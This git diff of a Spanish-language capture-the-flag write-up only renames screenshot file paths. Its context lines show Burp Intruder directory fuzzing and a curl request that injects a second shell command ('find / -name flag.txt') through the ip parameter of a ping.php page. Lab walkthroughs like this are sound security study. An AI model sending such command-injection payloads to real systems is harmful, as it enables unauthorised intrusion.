@@ -113,7 +113,7 @@ Configuramos en el **Intruder** el ataque con el diccionario **common.txt** de *
 
 Empezamos ataque.
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
  curl http://94.237.60.55:33802/admin/2010.html
@@ -167,7 +167,7 @@ Este archivo suponemos que realiza alguna inyección de comandos con el parámet
 curl -s "http://94.237.60.55:35284/devtools/ping.php?ip=127.0.0.1%3Bfind%20/%20-name%20flag.txt%202%3E/dev/null"
 ```
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Ya sabemos donde está ahora solo queda leerlo.
 
